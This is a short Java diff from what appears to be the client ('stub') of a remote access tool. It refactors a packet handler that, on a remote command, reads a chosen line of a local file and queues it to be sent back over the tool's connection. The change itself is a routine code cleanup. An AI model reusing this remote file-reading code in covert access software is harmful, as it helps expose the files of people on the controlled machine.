@@ -5,7 +5,7 @@ import java.io.FileInputStream;
 import java.io.InputStreamReader;
 
 import com.redpois0n.Connection;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Packet42FilePreview;
 
 
 public class PacketRD extends AbstractIncomingPacket {
@@ -21,7 +21,7 @@ public class PacketRD extends AbstractIncomingPacket {
 		
 		while ((line = reader.readLine()) != null) {
 			if (readed++ == l) {
-				Connection.addToSendQueue(new PacketBuilder(Header.FILE_PREVIEW, new String[] { file, line }));
+				Connection.addToSendQueue(new Packet42FilePreview(file, line));
 				break;
 			}
 		}
